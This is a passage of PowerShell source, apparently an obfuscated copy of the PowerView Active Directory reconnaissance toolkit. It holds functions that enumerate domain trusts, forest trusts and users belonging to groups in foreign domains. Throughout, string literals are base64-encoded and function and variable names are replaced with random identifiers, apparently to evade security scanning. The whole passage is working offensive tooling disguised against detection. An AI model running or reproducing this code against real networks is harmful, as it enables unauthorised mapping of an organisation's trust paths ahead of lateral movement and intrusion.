            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAF8AVQBTAEUAUwBfAFIAQwA0AF8ARQBOAEMAUgBZAFAAVABJAE8ATgA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAF8AVQBTAEUAUwBfAEEARQBTAF8ASwBFAFkAUwA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAyADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAE8AUwBTAF8ATwBSAEcAQQBOAEkAWgBBAFQASQBPAE4AXwBOAE8AXwBUAEcAVABfAEQARQBMAEUARwBBAFQASQBPAE4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAA0ADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAE0AXwBUAFIAVQBTAFQA')))
        }
        ${ba5cdc6e30c54b498d7ccd8f51e12566} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${ba5cdc6e30c54b498d7ccd8f51e12566}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${ba5cdc6e30c54b498d7ccd8f51e12566}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${ba5cdc6e30c54b498d7ccd8f51e12566}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${ba5cdc6e30c54b498d7ccd8f51e12566}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${ba5cdc6e30c54b498d7ccd8f51e12566}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${ba5cdc6e30c54b498d7ccd8f51e12566}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${ba5cdc6e30c54b498d7ccd8f51e12566}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${ba5cdc6e30c54b498d7ccd8f51e12566}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${ba5cdc6e30c54b498d7ccd8f51e12566}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${ba5cdc6e30c54b498d7ccd8f51e12566}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
            ${b06a4af43e63480cb1139712d9468832} = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                ${e9838cb35d274610af54c5966a734a9c} = $Domain
            }
            else {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                    ${e9838cb35d274610af54c5966a734a9c} = (c57d9aa48a49482b961291cafd0dde18 -Credential $Credential).Name
                }
                else {
                    ${e9838cb35d274610af54c5966a734a9c} = (c57d9aa48a49482b961291cafd0dde18).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))) {
            if ($Domain -and $Domain.Trim() -ne '') {
                ${e9838cb35d274610af54c5966a734a9c} = $Domain
            }
            else {
                ${e9838cb35d274610af54c5966a734a9c} = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA=')))) {
            ${09a0f9c8a61c48c5bc322e955aa17711} = d99af1f025294e4b8cf632a3987179c6 @ba5cdc6e30c54b498d7ccd8f51e12566
            ${f809881bc1e34ee5aef98bb21a4873ad} = c2fe926a73eb4d16beae5e1f576b1afb @b06a4af43e63480cb1139712d9468832
            if (${09a0f9c8a61c48c5bc322e955aa17711}) {
                ${09a0f9c8a61c48c5bc322e955aa17711}.Filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQB0AHIAdQBzAHQAZQBkAEQAbwBtAGEAaQBuACkA')))
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${c1d2f3b775df48dfbe092797965c6f30} = ${09a0f9c8a61c48c5bc322e955aa17711}.FindOne() }
                else { ${c1d2f3b775df48dfbe092797965c6f30} = ${09a0f9c8a61c48c5bc322e955aa17711}.FindAll() }
                ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                    ${15c22e840aeb4ab08bce974be1774ae1} = $_.Properties
                    ${80837633e9ed4366982d47c5f501d2d5} = New-Object PSObject
                    ${e8f65f53f4bb40828450bdb8b88b06c7} = @()
                    ${e8f65f53f4bb40828450bdb8b88b06c7} += ${ef05e9403b424bc983087be445a0d7b4}.Keys | Where-Object { ${15c22e840aeb4ab08bce974be1774ae1}.trustattributes[0] -band $_ } | ForEach-Object { ${ef05e9403b424bc983087be445a0d7b4}[$_] }
                    ${0ec09c8d5f4d45b9ad01e4f760fbaa61} = Switch (${15c22e840aeb4ab08bce974be1774ae1}.trustdirection) {
                        0 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) }
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGIAbwB1AG4AZAA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAYgBvAHUAbgBkAA=='))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAGQAaQByAGUAYwB0AGkAbwBuAGEAbAA='))) }
                    }
                    ${76113670739c49fe983644f01fa7b79a} = Switch (${15c22e840aeb4ab08bce974be1774ae1}.trusttype) {
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAE4ARABPAFcAUwBfAE4ATwBOAF8AQQBDAFQASQBWAEUAXwBEAEkAUgBFAEMAVABPAFIAWQA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAE4ARABPAFcAUwBfAEEAQwBUAEkAVgBFAF8ARABJAFIARQBDAFQATwBSAFkA'))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBJAFQA'))) }
                    }
                    ${fb29fd144fd84be7984a06cbbf78531d} = ${15c22e840aeb4ab08bce974be1774ae1}.distinguishedname[0]
                    ${65479f8004ae4b5c86ec92356da10218} = ${fb29fd144fd84be7984a06cbbf78531d}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                    if (${65479f8004ae4b5c86ec92356da10218}) {
                        ${e9838cb35d274610af54c5966a734a9c} = $(${fb29fd144fd84be7984a06cbbf78531d}.SubString(${65479f8004ae4b5c86ec92356da10218})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    }
                    else {
                        ${e9838cb35d274610af54c5966a734a9c} = ""
                    }
                    ${21582b6dc2354d99ac8c7c4dc0541885} = ${fb29fd144fd84be7984a06cbbf78531d}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABDAE4APQBTAHkAcwB0AGUAbQA='))))
                    if (${65479f8004ae4b5c86ec92356da10218}) {
                        $TargetDomain = ${fb29fd144fd84be7984a06cbbf78531d}.SubString(3, ${21582b6dc2354d99ac8c7c4dc0541885}-3)
                    }
                    else {
                        $TargetDomain = ""
                    }
                    ${0775752905c14485b210837dd117e0ec} = New-Object Guid @(,${15c22e840aeb4ab08bce974be1774ae1}.objectguid[0])
                    ${0060f067032040ef8393c187e7a9dae3} = (New-Object System.Security.Principal.SecurityIdentifier(${15c22e840aeb4ab08bce974be1774ae1}.securityidentifier[0],0)).Value
                    ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) ${e9838cb35d274610af54c5966a734a9c}
                    ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) ${15c22e840aeb4ab08bce974be1774ae1}.name[0]
                    ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) ${76113670739c49fe983644f01fa7b79a}
                    ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) $(${e8f65f53f4bb40828450bdb8b88b06c7} -join ',')
                    ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEQAaQByAGUAYwB0AGkAbwBuAA=='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAZQBjADAAOQBjADgAZAA1AGYANABkADQANQBiADkAYQBkADAAMQBlADQAZgA3ADYAMABmAGIAYQBhADYAMQB9AA==')))
                    ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBDAHIAZQBhAHQAZQBkAA=='))) ${15c22e840aeb4ab08bce974be1774ae1}.whencreated[0]
                    ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBDAGgAYQBuAGcAZQBkAA=='))) ${15c22e840aeb4ab08bce974be1774ae1}.whenchanged[0]
                    ${80837633e9ed4366982d47c5f501d2d5}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBMAEQAQQBQAA=='))))
                    ${80837633e9ed4366982d47c5f501d2d5}
                }
                if (${c1d2f3b775df48dfbe092797965c6f30}) {
                    try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                    }
                }
                ${09a0f9c8a61c48c5bc322e955aa17711}.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
                ${dfa5c56257694561963fa69cc00a4c27} = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                ${dfa5c56257694561963fa69cc00a4c27} = $Domain
            }
            else {
                ${dfa5c56257694561963fa69cc00a4c27} = $Null
            }
            ${ee3c5c3d774c465195daa8ee399bdd14} = [IntPtr]::Zero
            ${8f5071fe28ba461488911a279c7fab46} = 63
            ${b944f1c01a1c451f8e567f62514a9836} = 0
            ${186e3848daf342ca8207aeecd0de4352} = ${94271fac322f428e9deaac6d91dfc36e}::DsEnumerateDomainTrusts(${dfa5c56257694561963fa69cc00a4c27}, ${8f5071fe28ba461488911a279c7fab46}, [ref]${ee3c5c3d774c465195daa8ee399bdd14}, [ref]${b944f1c01a1c451f8e567f62514a9836})
            ${b80d9562f792404db0205d365e956f5e} = ${ee3c5c3d774c465195daa8ee399bdd14}.ToInt64()
            if ((${186e3848daf342ca8207aeecd0de4352} -eq 0) -and (${b80d9562f792404db0205d365e956f5e} -gt 0)) {
                ${3c5be92cf1c54e5e96ef59cd44e2283f} = ${fa7dfa09adfb47788db1c63ffaa7aca1}::GetSize()
                for (${35c58f1556d947ac8053e2f546574b9e} = 0; (${35c58f1556d947ac8053e2f546574b9e} -lt ${b944f1c01a1c451f8e567f62514a9836}); ${35c58f1556d947ac8053e2f546574b9e}++) {
                    ${c42795f7e27f4b1796f667d7a8a53e28} = New-Object System.Intptr -ArgumentList ${b80d9562f792404db0205d365e956f5e}
                    ${bb98c29e808a43c19f4dca0be9ac26b2} = ${c42795f7e27f4b1796f667d7a8a53e28} -as ${fa7dfa09adfb47788db1c63ffaa7aca1}
                    ${b80d9562f792404db0205d365e956f5e} = ${c42795f7e27f4b1796f667d7a8a53e28}.ToInt64()
                    ${b80d9562f792404db0205d365e956f5e} += ${3c5be92cf1c54e5e96ef59cd44e2283f}
                    ${8c11d140990b4ddf9ada00c5a4ed6f0a} = ''
                    ${186e3848daf342ca8207aeecd0de4352} = ${010428763869431e80e18c1b0127d8f7}::ConvertSidToStringSid(${bb98c29e808a43c19f4dca0be9ac26b2}.DomainSid, [ref]${8c11d140990b4ddf9ada00c5a4ed6f0a});${a4b4c23e0ef94f2bab076518375de072} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if (${186e3848daf342ca8207aeecd0de4352} -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] ${a4b4c23e0ef94f2bab076518375de072}).Message)"
                    }
                    else {
                        ${80837633e9ed4366982d47c5f501d2d5} = New-Object PSObject
                        ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) ${e9838cb35d274610af54c5966a734a9c}
                        ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) ${bb98c29e808a43c19f4dca0be9ac26b2}.DnsDomainName
                        ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBlAHQAYgBpAG8AcwBOAGEAbQBlAA=='))) ${bb98c29e808a43c19f4dca0be9ac26b2}.NetbiosDomainName
                        ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))) ${bb98c29e808a43c19f4dca0be9ac26b2}.Flags
                        ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAZQBuAHQASQBuAGQAZQB4AA=='))) ${bb98c29e808a43c19f4dca0be9ac26b2}.ParentIndex
                        ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) ${bb98c29e808a43c19f4dca0be9ac26b2}.TrustType
                        ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) ${bb98c29e808a43c19f4dca0be9ac26b2}.TrustAttributes
                        ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBpAGQA'))) ${8c11d140990b4ddf9ada00c5a4ed6f0a}
                        ${80837633e9ed4366982d47c5f501d2d5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARwB1AGkAZAA='))) ${bb98c29e808a43c19f4dca0be9ac26b2}.DomainGuid
                        ${80837633e9ed4366982d47c5f501d2d5}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBBAFAASQA='))))
                        ${80837633e9ed4366982d47c5f501d2d5}
                    }
                }
                $Null = ${94271fac322f428e9deaac6d91dfc36e}::NetApiBufferFree(${ee3c5c3d774c465195daa8ee399bdd14})
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] ${186e3848daf342ca8207aeecd0de4352}).Message)"
            }
        }
        else {
            ${6d94566bdb0646b6b83c94bdab9f00ed} = c57d9aa48a49482b961291cafd0dde18 @b06a4af43e63480cb1139712d9468832
            if (${6d94566bdb0646b6b83c94bdab9f00ed}) {
                ${6d94566bdb0646b6b83c94bdab9f00ed}.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBOAEUAVAA='))))
                    $_
                }
            }
        }
    }
}
function d2abe6f59b2e45909b37ef0d92c496a8 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${41dbe173c1844d868b379f5172b6fb41} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${41dbe173c1844d868b379f5172b6fb41}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${41dbe173c1844d868b379f5172b6fb41}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${cb51123c652043bc9edefe7565478a4a} = a1f50b6c1bc641b48c8648605758f288 @41dbe173c1844d868b379f5172b6fb41
        if (${cb51123c652043bc9edefe7565478a4a}) {
            ${cb51123c652043bc9edefe7565478a4a}.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAHMAdABUAHIAdQBzAHQALgBOAEUAVAA='))))
                $_
            }
        }
    }
}
function Get-DomainForeignUser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAGUAbQBiAGUAcgBvAGYAPQAqACkA')))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $Raw }
    }
    PROCESS {
        c4bfd1c2423d4aa09ab761a468a38f7e @afd7d337a750465cb1eadfa1f8ae176d  | ForEach-Object {
            ForEach (${9adbe07e9e6946d78d3e1ac6dd36e287} in $_.memberof) {
                ${a7af3c04c4164e3e9167fabd4c7e44fd} = ${9adbe07e9e6946d78d3e1ac6dd36e287}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                if (${a7af3c04c4164e3e9167fabd4c7e44fd}) {
                    ${4f012487c687470fbf918145202d0777} = $(${9adbe07e9e6946d78d3e1ac6dd36e287}.SubString(${a7af3c04c4164e3e9167fabd4c7e44fd})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    ${5ef1b38dee0844099963f57e769dc9f8} = $_.distinguishedname
                    ${e62530687aee4f3db1b86391bf20c0e6} = ${5ef1b38dee0844099963f57e769dc9f8}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                    $UserDomain = $($_.distinguishedname.SubString(${e62530687aee4f3db1b86391bf20c0e6})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    if (${4f012487c687470fbf918145202d0777} -ne $UserDomain) {
                        ${14eb3c56654d4851b0c0e59e10d33e62} = ${9adbe07e9e6946d78d3e1ac6dd36e287}.Split(',')[0].split('=')[1]
                        ${1a5d3224ed764fa0a6cfa47ec062dbd3} = New-Object PSObject
                        ${1a5d3224ed764fa0a6cfa47ec062dbd3} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                        ${1a5d3224ed764fa0a6cfa47ec062dbd3} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $_.samaccountname
                        ${1a5d3224ed764fa0a6cfa47ec062dbd3} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUA'))) $_.distinguishedname
                        ${1a5d3224ed764fa0a6cfa47ec062dbd3} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${4f012487c687470fbf918145202d0777}
                        ${1a5d3224ed764fa0a6cfa47ec062dbd3} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${14eb3c56654d4851b0c0e59e10d33e62}
